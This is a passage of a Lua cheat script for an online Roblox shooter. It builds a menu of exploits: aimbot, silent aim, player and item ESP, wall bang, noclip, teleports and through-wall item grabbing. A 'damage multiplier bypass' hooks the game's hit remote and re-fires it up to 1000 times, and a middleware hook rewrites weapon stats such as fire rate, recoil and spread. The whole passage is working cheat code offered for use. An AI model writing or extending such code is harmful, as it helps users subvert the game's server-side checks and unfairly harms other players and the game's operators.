    UILib:CreateNotification({Text = "Mobile Controls: J=Menu, A=Aim, F=Fly", Duration = 5})
else
    UILib:CreateNotification({Text = "Press Right Shift to toggle UI", Duration = 5})
end

-- ========================================
-- BYPASS: DAMAGE MULTIPLIER (Hook repHit)
-- ========================================
-- Since math.clamp can't be bypassed easily on some executors, 
-- we multiply the HIT signal instead of the bullet count.
-- 20 bullets x 25 multiplier = 500 hits!

task.spawn(function()
    task.wait(2) -- Wait for BridgeNet2
    pcall(function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local BridgeNet2 = require(ReplicatedStorage.Assets.Modules.BridgeNet2)
        local repHit = BridgeNet2.ClientBridge("__repHit")
        
        if repHit and repHit.Fire then
            local originalFire = repHit.Fire
            
            -- Hook the Fire function of the bridge
            repHit.Fire = function(self, args)
                -- Always fire once
                originalFire(self, args)
                
                -- If multiplier is active, fire extra times
                -- NOTE: Server may have damage caps that limit extreme values
                if Config.DamageMultiplier and Config.DamageMultiplier > 1 then
                   for i = 1, Config.DamageMultiplier - 1 do
                        originalFire(self, args)
                    end
                end
            end
        end
    end)
end)

-- ========================================
-- WEAPON MODIFICATION SYSTEM (BridgeNet2)
-- ========================================
local WeaponOriginalStats = {}
local CurrentWeaponName = "None"

task.spawn(function()
    task.wait(1) -- Wait for BridgeNet2 to load
    
    pcall(function()
        local BridgeNet2 = require(ReplicatedStorage.Assets.Modules.BridgeNet2)
        local equipWeapon = BridgeNet2.ClientBridge("equipWeapon")
        
        if equipWeapon then
            equipWeapon:InboundMiddleware({
                function(data)
                    if data.wepStats then
                        local weaponName = (data.tool and data.tool.Name) or "Unknown"
                        CurrentWeaponName = weaponName
                        
                        -- Store original stats on first equip
                        if not next(WeaponOriginalStats) then
                            WeaponOriginalStats = {
                                FireRate = data.wepStats.FireRate or 0,
                                Spread = data.wepStats.Spread or 0,
                                MuzzleVelocity = data.wepStats.MuzzleVelocity or 0,
                                BulletsFired = data.wepStats.BulletsFired or 1
                            }
                        end
                        
                        if Config.WeaponModEnabled then
                            pcall(function()
                                local stats = data.wepStats
                                if setreadonly then setreadonly(stats, false) end
                                
                                -- Apply basic stats
                                if rawget(stats, "FireRate") then rawset(stats, "FireRate", Config.WeaponFireRate) end
                                if rawget(stats, "FireMode") then rawset(stats, "FireMode", "Auto") end
                                if rawget(stats, "MuzzleVelocity") then rawset(stats, "MuzzleVelocity", Config.WeaponMuzzleVelocity) end
                                if rawget(stats, "BulletsFired") then rawset(stats, "BulletsFired", Config.WeaponBulletsFired) end
                                if rawget(stats, "Spread") then rawset(stats, "Spread", Config.WeaponSpread) end
                                if rawget(stats, "ViewPunch") then rawset(stats, "ViewPunch", Config.WeaponViewPunch) end
                                if rawget(stats, "BurstAmount") then rawset(stats, "BurstAmount", Config.WeaponBurstAmount) end
                                
                                -- Apply recoil
                                if rawget(stats, "Recoil") and type(stats.Recoil) == "table" then
                                    if setreadonly then setreadonly(stats.Recoil, false) end
                                    if rawget(stats.Recoil, "Vertical") then rawset(stats.Recoil, "Vertical", Config.WeaponRecoilVertical) end
                                    if rawget(stats.Recoil, "Horizontal") then rawset(stats.Recoil, "Horizontal", Config.WeaponRecoilHorizontal) end
                                end
                                
                                -- Apply accuracy/spread
                                if rawget(stats, "Accuracy") and type(stats.Accuracy) == "table" then
                                    if setreadonly then setreadonly(stats.Accuracy, false) end
                                    if rawget(stats.Accuracy, "initialSpread") then rawset(stats.Accuracy, "initialSpread", Config.WeaponInitialSpread) end
                                    if rawget(stats.Accuracy, "maxSpread") then rawset(stats.Accuracy, "maxSpread", Config.WeaponMaxSpread) end
                                end
                                
                                -- Apply reload speed
                                if rawget(stats, "reloadAnimSpeed") then
                                    rawset(stats, "reloadAnimSpeed", Config.WeaponReloadSpeed)
                                end
                                
                                -- Apply damage falloff
                                if rawget(stats, "StartDamageDropoff") then
                                    rawset(stats, "StartDamageDropoff", Config.WeaponStartDamageDropoff)
                                end
                                if rawget(stats, "MaxDamageDropOff") then
                                    rawset(stats, "MaxDamageDropOff", Config.WeaponMaxDamageDropOff)
                                end
                            end)
                        end
                    end
                    
                    return data
                end
            })
        end
    end)
end)

local CombatPanel = UILib:CreatePanel(Window, {
    Name = "Combat",
    DisplayName = "Combat"
})
UILib:CreateCollapsibleToggle(CombatPanel, {
    Label = "Aimbot (Hold Right Click)",
    Default = false,
    Callback = function(value)
        Config.Aimbot = value
    end,
    SubToggles = {
        {
            Label = "Wall Check",
            Default = true,
            Callback = function(value)
                Config.WallCheck = value
            end
        },
        {
            Label = "Ignore Ally",
            Default = true,
            Callback = function(value)
                Config.IgnoreAlly = value
            end
        },
        {
            Label = "Show FOV Circle",
            Default = true,
            Callback = function(value)
                Config.ShowAimbotFOV = value
            end
        }
    }
})  

UILib:CreateSlider(CombatPanel, {
    Text = "Aimbot FOV",
    Min = 50,
    Max = 500,
    Default = 200,
    Callback = function(value)
        Config.AimbotFOV = value
    end
})
UILib:CreateSlider(CombatPanel, {
    Text = "Aimbot Smoothness",
    Min = 1,
    Max = 20,
    Default = 5,
    Callback = function(value)
        Config.AimbotSmooth = value
    end
})

UILib:CreateCollapsibleToggle(CombatPanel, {
    Label = "Silent Aim",
    Default = false,
    Callback = function(value)
        Config.SilentAim = value
    end,
    SubToggles = {
        {
            Label = "Wall Check",
            Default = true,
            Callback = function(value)
                Config.WallCheck = value
            end
        },
        {
            Label = "Ignore Ally",
            Default = true,
            Callback = function(value)
                Config.IgnoreAlly = value
            end
        },
        {
            Label = "Show FOV Circle",
            Default = true,
            Callback = function(value)
                Config.ShowSilentAimFOV = value
            end
        },
        {
            Label = "Cycle-Shot",
            Default = false,
            Callback = function(value)
                Config.CycleShot = value
            end
        }
    }
})

UILib:CreateSlider(CombatPanel, {
    Text = "Silent Aim FOV",
    Min = 50,
    Max = 500,
    Default = 200,
    Callback = function(value)
        Config.SilentAimFOV = value
    end
})

UILib:CreateDropdown(CombatPanel, {
    Label = "Aim Assist Target",
    Options = {"Head Only", "Body Only", "Humanized"},
    Default = "Humanized",
    Callback = function(value)
        Config.AimAssistTarget = value
    end
})




UILib:CreateToggle(CombatPanel, {
    Label = "Wall Bang (Thin Walls)",
    Default = false,
    Callback = function(value)
        Config.WallBang = value
    end
})


UILib:CreateToggle(CombatPanel, {
    Label = "Rapid Fire",
    Default = false,
    Callback = function(value)
        if value then
            Config.WeaponModEnabled = true
            Config.WeaponFireRate = 5000
            Config.WeaponRecoilVertical = 0
            Config.WeaponRecoilHorizontal = 0
            Config.WeaponSpread = 0
            Config.WeaponMuzzleVelocity = 800
            Config.WeaponBulletsFired = 1
            Config.WeaponViewPunch = 0
            Config.WeaponInitialSpread = 0
            Config.WeaponMaxSpread = 0
            Config.WeaponStartDamageDropoff = 9999
            Config.WeaponMaxDamageDropOff = 9999
        else
            Config.WeaponModEnabled = false
        end
    end
})

UILib:CreateToggle(CombatPanel, {
    Label = "No Recoil",
    Default = false,
    Callback = function(value)
        if value then
            Config.WeaponModEnabled = true
            Config.WeaponRecoilVertical = 0
            Config.WeaponRecoilHorizontal = 0
        else
            Config.WeaponModEnabled = false
        end
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "No Spread",
    Default = false,
    Callback = function(value)
        if value then
            Config.WeaponModEnabled = true
            Config.WeaponSpread = 0
            Config.WeaponInitialSpread = 0
            Config.WeaponMaxSpread = 0
        else
            Config.WeaponModEnabled = false
        end
    end
})
UILib:CreateSlider(CombatPanel, {
    Text = "Damage Multiplier",
    Min = 1,
    Max = 1000,
    Default = 1,
    Callback = function(value)
        Config.DamageMultiplier = value
        if value > 1 then
            UILib:CreateNotification({
                Text = "Damage set to " .. value .. "x",
                Duration = 2
            })
        else
            UILib:CreateNotification({
                Text = "Damage back to normal (1x)",
                Duration = 2
            })
        end
    end
})

local ESPPanel = UILib:CreatePanel(Window, {
    Name = "ESP",
    DisplayName = "ESP"
})
UILib:CreateToggle(ESPPanel, {
    Label = "Player ESP",
    Default = false,
    Callback = function(value)
        Config.PlayerESP = value
        if value then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    createPlayerESP(player.Character)
                end
            end
        else
            for _, esp in pairs(_G.RetroBreach.ESPHighlights) do
                if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
                if esp.teamText then pcall(function() esp.teamText:Remove() end) end
                if esp.nameText then pcall(function() esp.nameText:Remove() end) end
                if esp.healthText then pcall(function() esp.healthText:Remove() end) end
                if esp.itemsText then pcall(function() esp.itemsText:Remove() end) end
            end
            _G.RetroBreach.ESPHighlights = {}
        end
    end
})
UILib:CreateToggle(ESPPanel, {
    Label = "Item ESP",
    Default = false,
    Callback = function(value)
        Config.ItemESP = value
        updateItemESP()
    end
})

-- ESP Display Options
UILib:CreateToggle(ESPPanel, {
    Label = "Show Role",
    Default = true,
    Callback = function(value)
        Config.ESPShowRole = value
    end
})
UILib:CreateToggle(ESPPanel, {
    Label = "Show Player Name",
    Default = true,
    Callback = function(value)
        Config.ESPShowName = value
    end
})
UILib:CreateToggle(ESPPanel, {
    Label = "Show Health",
    Default = true,
    Callback = function(value)
        Config.ESPShowHealth = value
    end
})
UILib:CreateToggle(ESPPanel, {
    Label = "Show Player Items",
    Default = true,
    Callback = function(value)
        Config.ESPShowItems = value
    end
})

UILib:CreateButton(ESPPanel, {
    Text = "Refresh ESP",
    Callback = function()
        updateItemESP()
    end
})
local PlayerPanel = UILib:CreatePanel(Window, {
    Name = "Player",
    DisplayName = "Player"
})
UILib:CreateSlider(PlayerPanel, {
    Text = "Walk Speed",
    Min = 16,
    Max = 200,
    Default = 16,
    Callback = function(value)
        Config.WalkSpeed = value
    end
})
UILib:CreateSlider(PlayerPanel, {
    Text = "Jump Power",
    Min = 50,
    Max = 200,
    Default = 50,
    Callback = function(value)
        Config.JumpPower = value
    end
})
local originalCollisionStates = {}
UILib:CreateToggle(PlayerPanel, {
    Label = "NoClip (Toggle Or Hold B)",
    Default = false,
    Callback = function(value)
        Config.NoClip = value
        if not value and LocalPlayer.Character then
            for part, originalState in pairs(originalCollisionStates) do
                if part and part.Parent then
                    part.CanCollide = originalState
                end
            end
            originalCollisionStates = {}
        elseif value and LocalPlayer.Character then
            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    originalCollisionStates[part] = part.CanCollide
                end
            end
        end
    end
})

UILib:CreateToggle(PlayerPanel, {
    Label = "Infinite Stamina",
    Default = false,
    Callback = function(value)
        Config.InfiniteStamina = value
    end
})

-- Renaming for Mobile (Infinite Run)
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    -- It's hard to change the Text of a created Toggle directly without object access
    -- But we can assume the user knows. Or if UILib returned the object, we could.
    -- Since we don't capture the return, we'll rely on the functionality change.
end
-- Room Teleport Dropdown
UILib:CreateDropdown(PlayerPanel, {
    Label = "Room Teleport",
    Options = {"Class D Cells", "Entrance Zone", "914", "Heavy Containment Zone", "Gate A", "Gate B", "Gate A Surface", "Gate B Surface", "Alpha Warhead"},
    Callback = function(selected)
        teleportToRoom(selected)
    end
})


-- Rage Fly is embedded at the end of the script
-- Toggle it below, press V to activate fly
UILib:CreateToggle(PlayerPanel, {
    Label = "Rage Fly (Press V)",
    Default = false,
    Callback = function(value)
        Config.RageFly = value
        if value then
            UILib:CreateNotification({
                Text = "Press V to toggle Rage Fly",
                Duration = 3
            })
        end
    end
})


-- Player Teleport Dropdown
local function getPlayerList()
    local playerList = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(playerList, getPlayerDisplayName(player))
        end
    end
    table.sort(playerList)
    return playerList
end

local playerDropdown = UILib:CreateDropdown(PlayerPanel, {
    Label = "Teleport to Player",
    Options = getPlayerList(),
    Callback = function(selectedPlayer)
        -- Safety Check: Don't teleport to void
        local targetPlayer = Players:FindFirstChild(selectedPlayer)
        if targetPlayer and targetPlayer.Character then
            local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetHRP then
                if targetHRP.Position.Y < -400 then
                     UILib:CreateNotification({Text = "Target is in VOID ("..math.floor(targetHRP.Position.Y).."). Cancelled.", Duration = 3})
                     return
                end
                -- Optional: Check for safe zone if needed, but void is priority
            end
        end
        teleportToPlayer(selectedPlayer)
    end,
    Searchable = true  -- Enable search if UILib supports it
})

-- Update player list every 3 seconds
task.spawn(function()
    while true do
        task.wait(3)
        local newPlayerList = getPlayerList()
        
        if playerDropdown and playerDropdown.UpdateOptions then
            playerDropdown.UpdateOptions(newPlayerList)
        end
    end
end)

local selectedItem = nil
local allItems = {}

local function getUniqueItems()
    local success, result = pcall(function()
        local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
        if not itemsFolder then
            return {"No ItemSpawns folder"}
        end
        
        if not LocalPlayer.Character then
            return {"Waiting for character..."}
        end
        
        local myRoot = getRoot(LocalPlayer.Character)
        if not myRoot then
            return {"No HumanoidRootPart"}
        end
        
        local excludeList = {
            "EZ1", "EZ2", "EZ3", "EZ4",
            "HCZ1", "HCZ2",
            "LCZ1", "LCZ2", "LCZ3", "LCZ4", "LCZ5", "LCZ6", "LCZ7", "LCZ8",
            "Part", "SU1"
        }
        
        local itemDistances = {}
        local MAX_DISTANCE = 2500
        
        for _, item in ipairs(itemsFolder:GetChildren()) do
            local itemName = item.Name
            local shouldExclude = false
            for _, excluded in ipairs(excludeList) do
                if itemName == excluded then
                    shouldExclude = true
                    break
                end
            end
            
            if not shouldExclude then
                local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart")
                if handle then
                    local distance = (handle.Position - myRoot.Position).Magnitude
                    if not itemDistances[itemName] or distance < itemDistances[itemName] then
                        itemDistances[itemName] = distance
                    end
                end
            end
        end
        
        local itemNames = {}
        for itemName, distance in pairs(itemDistances) do
            if distance <= MAX_DISTANCE then
                table.insert(itemNames, itemName)
            else
            end
        end
        table.sort(itemNames)
        
        if #itemNames == 0 then
            return {"No items within 2500 studs"}
        end
        
        return itemNames
    end)
    
    if success then
        return result
    else
        return {"Error scanning items"}
    end
end

allItems = getUniqueItems()

local itemDropdown = UILib:CreateDropdown(PlayerPanel, {
    Label = "Items Within 2500 Studs",
    Options = allItems,
    EnableSearch = true,
    Callback = function(option)
        selectedItem = option
    end
})

task.spawn(function()
    while true do
        task.wait(3)
        local newItems = getUniqueItems()
        
        if itemDropdown and itemDropdown.UpdateOptions then
            itemDropdown.UpdateOptions(newItems)
        end
        
        allItems = newItems
    end
end)

local function smoothTeleport(targetPos, stepSize)
    local success, result = pcall(function()
        if not LocalPlayer.Character then return false end
        local myRoot = getRoot(LocalPlayer.Character)
        if not myRoot then return false end
        
        local startPos = myRoot.Position
        local distance = (targetPos - startPos).Magnitude
        
        local steps = math.ceil(distance / stepSize)
        local MAX_STEPS = 15
        
        if steps > MAX_STEPS then
            stepSize = math.ceil(distance / MAX_STEPS)
            steps = MAX_STEPS
        end
        
        for i = 1, steps do
            if not myRoot or not myRoot.Parent then break end
            
            local alpha = i / steps
            local newPos = startPos:Lerp(targetPos, alpha)
            
            pcall(function()
                myRoot.CFrame = CFrame.new(newPos)
                myRoot.Velocity = Vector3.new(0, 0, 0)
                myRoot.RotVelocity = Vector3.new(0, 0, 0)
                if myRoot.AssemblyLinearVelocity then
                    myRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                end
                if myRoot.AssemblyAngularVelocity then
                    myRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end)
            
            RunService.Heartbeat:Wait()
            task.wait(math.random(10, 15) / 100)
            
            if i % 5 == 0 then
                task.wait(0.1)
            end
        end
        
        return true
    end)
    
    return success and result
end

local function smoothTeleport(targetPosition, stepSize)
    stepSize = stepSize or 50
    local char = LocalPlayer.Character
    if not char then return end
    
    local myRoot = getRoot(char)
    if not myRoot then return end
    
    local startPos = myRoot.Position
    local distance = (targetPosition - startPos).Magnitude
    local steps = math.ceil(distance / stepSize)
    
    for i = 1, steps do
        if not myRoot or not myRoot.Parent then break end
        
        local alpha = i / steps
        local nextPos = startPos:Lerp(targetPosition, alpha)
        
        myRoot.Velocity = Vector3.new(0, 0, 0)
        myRoot.RotVelocity = Vector3.new(0, 0, 0)
        if myRoot:FindFirstChild("AssemblyLinearVelocity") then
            myRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        end
        if myRoot:FindFirstChild("AssemblyAngularVelocity") then
            myRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
        end
        
        myRoot.CFrame = CFrame.new(nextPos)
        RunService.Heartbeat:Wait()
        
        if i % 5 == 0 then
            task.wait(0.05)
        end
    end
end

local lastGrabTime = 0
local GRAB_COOLDOWN = 2

UILib:CreateButton(PlayerPanel, {
    Text = "Grab Selected Item",
    Callback = function()
        local currentTime = tick()
        local timeSinceLastGrab = currentTime - lastGrabTime
        
        if timeSinceLastGrab < GRAB_COOLDOWN then
            local remaining = math.ceil(GRAB_COOLDOWN - timeSinceLastGrab)
            UILib:CreateNotification({
                Text = "Cooldown! Wait " .. remaining .. " seconds",
                Duration = 2
            })
            return
        end
        
        lastGrabTime = currentTime
        
        task.spawn(function()
            -- Simple, reliable grab function (from click_grab_items.lua)
            local success, err = pcall(function()
                if not selectedItem or selectedItem == "Scanning..." or selectedItem == "No items found" or selectedItem == "No ItemSpawns folder" then
                    UILib:CreateNotification({
                        Text = "⚠️ No item selected!",
                        Duration = 2
                    })
                    return
                end
                
                if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    UILib:CreateNotification({
                        Text = "❌ Character not ready!",
                        Duration = 2
                    })
                    return
                end
                
                local myRoot = getRoot(LocalPlayer.Character)
                local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
                
                if not itemsFolder then
                    UILib:CreateNotification({
                        Text = "❌ No ItemSpawns folder!",
                        Duration = 2
                    })
                    return
                end
                
                -- Find closest matching item
                local targetItemModel = nil
                local closestDistance = math.huge
                
                for _, item in ipairs(itemsFolder:GetChildren()) do
                    if item.Name == selectedItem then
                        local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart")
                        if handle then
                            local distance = (handle.Position - myRoot.Position).Magnitude
                            if distance < closestDistance then
                                closestDistance = distance
                                targetItemModel = item
                            end
                        end
                    end
                end
                
                if not targetItemModel then
                    UILib:CreateNotification({
                        Text = "❌ Item not found: " .. selectedItem,
                        Duration = 2
                    })
                    return
                end
                
                -- Save original position for teleport back
                local originalPos = myRoot.CFrame
                
                -- Calculate distance and dynamic wait time
                local itemPos = targetItemModel:GetPivot().Position
                local originalDistance = closestDistance
                
                -- Scale wait time based on distance (0.3s to 1.0s)
                -- 0-500 studs = 0.3s
                -- 500-1000 studs = 0.5s
                -- 1000-2500 studs = 1.0s
                local waitTime = 0.3
                if originalDistance > 1000 then
                    waitTime = 1.0
                elseif originalDistance > 500 then
                    waitTime = 0.5
                end
                
                -- Teleport to item
                local targetPos = itemPos + Vector3.new(0, 3, 0)
                myRoot.CFrame = CFrame.new(targetPos)
                
                -- Wait for position to update (dynamic based on distance)
                task.wait(waitTime)
                
                -- Try to grab item
                local prompt = targetItemModel:FindFirstChildOfClass("ProximityPrompt") or
                               targetItemModel:FindFirstChildOfClass("ProximityPrompt", true)
                
                if prompt then
                    -- Store original values
                    local originalMaxDist = prompt.MaxActivationDistance
                    local originalRequiresLOS = prompt.RequiresLineOfSight
                    
                    -- Enable through-wall pickup
                    prompt.Enabled = true
                    prompt.HoldDuration = 0
                    prompt.MaxActivationDistance = 9999
                    prompt.RequiresLineOfSight = false
                    
                    -- Fire proximity prompt multiple times for reliability
                    for i = 1, 3 do
                        pcall(function()
                            fireproximityprompt(prompt)
                        end)
                        task.wait(0.1)
                    end
                    
                    -- Restore original values
                    pcall(function()
                        prompt.MaxActivationDistance = originalMaxDist
                        prompt.RequiresLineOfSight = originalRequiresLOS
                    end)
                    
                    UILib:CreateNotification({
                        Text = "✅ Grabbed: " .. selectedItem .. " (" .. math.floor(originalDistance) .. " studs)",
                        Duration = 2
                    })
                else
                    UILib:CreateNotification({
                        Text = "⚠️ No prompt found for " .. selectedItem,
                        Duration = 2
                    })
                end
                
                -- Wait longer for item to be picked up (scale with distance)
                task.wait(waitTime + 0.3)
                
                -- Teleport back to original position
                if myRoot and myRoot.Parent then
                    myRoot.CFrame = originalPos
                    UILib:CreateNotification({
                        Text = "🔙 Returned to original position",
                        Duration = 1.5
                    })
                end
            end)
            
            if not success then
                UILib:CreateNotification({
                    Text = "❌ Grab failed: " .. tostring(err),
                    Duration = 3
                })
            end
        end)
    end
})
UILib:CreateButton(PlayerPanel, {
    Text = "Escape",
    Callback = function()
        local success, err = pcall(function()
            if not LocalPlayer.Character then
                return
            end
            local myRoot = getRoot(LocalPlayer.Character)
            if not myRoot then
                return
            end
            
            local originalPos = myRoot.CFrame
            local escapePos = Vector3.new(1112.26, 566.00, 56.86)
            local distance = (escapePos - myRoot.Position).Magnitude
            
            if distance > 2500 then
                UILib:CreateNotification({
                    Text = "Escape too far: " .. math.floor(distance) .. " studs! (Max 2500)",
                    Duration = 4
                })
                return
            end
            
            myRoot.CFrame = CFrame.new(escapePos)
            
            task.wait(0.2)
            
            if myRoot and myRoot.Parent then
                myRoot.Velocity = Vector3.new(0, 0, 0)
                myRoot.RotVelocity = Vector3.new(0, 0, 0)
                local humanoid = getHumanoid(LocalPlayer.Character)
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                end
                myRoot.CFrame = originalPos
            end
        end)
        if not success then
        end
    end
})
UILib:CreateButton(PlayerPanel, {
    Text = "Refresh Items List",
    Callback = function()
        local success, err = pcall(function()
            local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
            if not itemsFolder then
                return
            end
            
            local excludeList = {
                "EZ1", "EZ2", "EZ3", "EZ4",
                "HCZ1", "HCZ2",
                "LCZ1", "LCZ2", "LCZ3", "LCZ4", "LCZ5", "LCZ6", "LCZ7", "LCZ8",
                "Part", "SU1"
            }
            
            local currentItems = {}
            local seen = {}
            for _, item in ipairs(itemsFolder:GetChildren()) do
                local itemName = item.Name
                local shouldExclude = false
                for _, excluded in ipairs(excludeList) do
                    if itemName == excluded then
                        shouldExclude = true
                        break
                    end
                end
                
                if not shouldExclude and not seen[itemName] then
                    seen[itemName] = true
                    table.insert(currentItems, itemName)
                end
            end
            table.sort(currentItems)
            
            for i, name in ipairs(currentItems) do
            end
        end)
        if not success then
        end
    end
})

local MiscPanel = UILib:CreatePanel(Window, {
    Name = "Misc",
    DisplayName = "Misc"
})
UILib:CreateToggle(MiscPanel, {
    Label = "Full Bright",
    Default = false,
    Callback = function(value)
        Config.FullBright = value
        if value then
            Lighting.Brightness = 2
            Lighting.ClockTime = 14
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = false
            Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
        else
            Lighting.Brightness = 1
            Lighting.ClockTime = 12
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = true
        end
    end
})
UILib:CreateButton(MiscPanel, {
    Text = "Rejoin Server",
    Callback = function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end
})
UILib:CreateButton(MiscPanel, {
    Text = "Close GUI",
    Callback = function()
        if Window.ScreenGui then
            Window.ScreenGui:Destroy()
        end
    end
})

-- ========================================
-- MODIFY GUNS PANEL
-- ========================================
local ModifyGunsPanel = UILib:CreatePanel(Window, {
    Name = "Modify Guns",
    DisplayName = "Modify Guns"
})

-- Master Toggle
UILib:CreateToggle(ModifyGunsPanel, {
    Label = "Weapon Mod",
    Default = false,
    Callback = function(value)
        Config.WeaponModEnabled = value
        ClampBypassEnabled = value  -- Enable/disable clamp bypass
        if value then
            UILib:CreateNotification({
                Text = "Weapon mods enabled",
                Duration = 3
            })
        else
            UILib:CreateNotification({
                Text = "Weapon mods disabled",
                Duration = 2
            })
        end
    end
})

-- Current Weapon Display
-- Current Weapon Display
task.spawn(function()
    task.wait(1.5) -- Wait longer for panel to be fully created
    
    local weaponLabel = nil
    pcall(function()
        -- Find ScrollingFrame in Modify Guns panel
        for _, obj in pairs(Window.ScreenGui:GetDescendants()) do
            if obj:IsA("ScrollingFrame") then
                local parent = obj.Parent
                if parent and (parent.Name:find("Modify") or parent.Name:find("Gun")) then
                    -- Create weapon name label at top of scrolling area
                    weaponLabel = Instance.new("TextLabel")
                    weaponLabel.Name = "WeaponNameDisplay"
                    weaponLabel.Size = UDim2.new(1, -20, 0, 30)
                    weaponLabel.Position = UDim2.new(0, 10, 0, 5)
                    weaponLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
                    weaponLabel.BorderSizePixel = 0
                    weaponLabel.Text = "  Weapon Selected: None"
                    weaponLabel.TextColor3 = Color3.fromRGB(255, 20, 147) -- Pink
                    weaponLabel.TextSize = 13
                    weaponLabel.Font = Enum.Font.GothamBold
                    weaponLabel.TextXAlignment = Enum.TextXAlignment.Left
                    weaponLabel.TextYAlignment = Enum.TextYAlignment.Center
                    weaponLabel.ZIndex = 100
                    weaponLabel.Parent = obj
                    
                    local corner = Instance.new("UICorner")
                    corner.CornerRadius = UDim.new(0, 6)
                    corner.Parent = weaponLabel
                    
                    break
                end
            end
        end
    end)
    
    -- Update weapon name every 0.5 seconds
    while true do
        task.wait(0.5)
        if weaponLabel and weaponLabel.Parent then
            pcall(function()
                weaponLabel.Text = "  Weapon Selected: " .. CurrentWeaponName
            end)
        end
    end
end)

-- Weapon Stats Sliders
UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Fire Rate (RPM)",
    Min = 50,
    Max = 5000,
    Default = 1900,
    Callback = function(value)
        Config.WeaponFireRate = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Bullets per Shot",
    Min = 1,
    Max = 9999,
    Default = 1,
    Callback = function(value)
        Config.WeaponBulletsFired = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Recoil Vertical",
    Min = 0,
    Max = 20,
    Default = 0,
    Callback = function(value)
        Config.WeaponRecoilVertical = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Recoil Horizontal",
    Min = 0,
    Max = 20,
    Default = 0,
    Callback = function(value)
        Config.WeaponRecoilHorizontal = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Spread",
    Min = 0,
    Max = 10,
    Default = 0,
    Callback = function(value)
        Config.WeaponSpread = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Muzzle Velocity",
    Min = 50,
    Max = 3000,
    Default = 500,
    Callback = function(value)
        Config.WeaponMuzzleVelocity = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Screen Shake",
    Min = 0,
    Max = 10,
    Default = 0,
    Callback = function(value)
        Config.WeaponViewPunch = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Burst Amount",
    Min = 1,
    Max = 10,
    Default = 1,
    Callback = function(value)
        Config.WeaponBurstAmount = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Initial Spread",
    Min = 0,
    Max = 20,
    Default = 0,
    Callback = function(value)
        Config.WeaponInitialSpread = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Max Spread",
    Min = 0,
    Max = 50,
    Default = 0,
    Callback = function(value)
        Config.WeaponMaxSpread = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Reload Speed Multiplier",
    Min = 0.1,
    Max = 5,
    Default = 1,
    Callback = function(value)
        Config.WeaponReloadSpeed = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Start Damage Dropoff (studs)",
    Min = 0,
    Max = 9999,
    Default = 9999,
    Callback = function(value)
        Config.WeaponStartDamageDropoff = value
    end
})

UILib:CreateSlider(ModifyGunsPanel, {
    Text = "Max Damage Dropoff (studs)",
    Min = 0,
    Max = 9999,
    Default = 9999,
    Callback = function(value)
        Config.WeaponMaxDamageDropOff = value
    end
})

-- Preset Buttons
UILib:CreateButton(ModifyGunsPanel, {
    Text = "Laser Attack Preset",
    Callback = function()
        Config.WeaponFireRate = 2000
        Config.WeaponRecoilVertical = 0
        Config.WeaponRecoilHorizontal = 0
        Config.WeaponSpread = 0
        Config.WeaponMuzzleVelocity = 3000
        Config.WeaponBulletsFired = 1
        Config.WeaponViewPunch = 0
        Config.WeaponInitialSpread = 0
        Config.WeaponMaxSpread = 0
        Config.WeaponReloadSpeed = 3
        Config.WeaponStartDamageDropoff = 9999
        Config.WeaponMaxDamageDropOff = 9999
        UILib:CreateNotification({
            Text = "Laser Attack loaded!",
            Duration = 2
        })
    end
})

UILib:CreateButton(ModifyGunsPanel, {
    Text = "Instant Kill Preset",
    Callback = function()
        Config.WeaponFireRate = 1500
        Config.WeaponRecoilVertical = 0
        Config.WeaponRecoilHorizontal = 0
        Config.WeaponSpread = 5
        Config.WeaponMuzzleVelocity = 1000
        Config.WeaponBulletsFired = 40
        Config.WeaponViewPunch = 0
        Config.WeaponInitialSpread = 2
        Config.WeaponMaxSpread = 5
        Config.WeaponReloadSpeed = 2
        Config.WeaponStartDamageDropoff = 50
        Config.WeaponMaxDamageDropOff = 100
        UILib:CreateNotification({
            Text = "Instant Kill loaded! (Re-equip weapon)",
            Duration = 2
        })
    end
})

UILib:CreateButton(ModifyGunsPanel, {
    Text = "Rapid Fire Preset",
    Callback = function()
        Config.WeaponFireRate = 5000
        Config.WeaponRecoilVertical = 0
        Config.WeaponRecoilHorizontal = 0
        Config.WeaponSpread = 0
        Config.WeaponMuzzleVelocity = 800
        Config.WeaponBulletsFired = 1
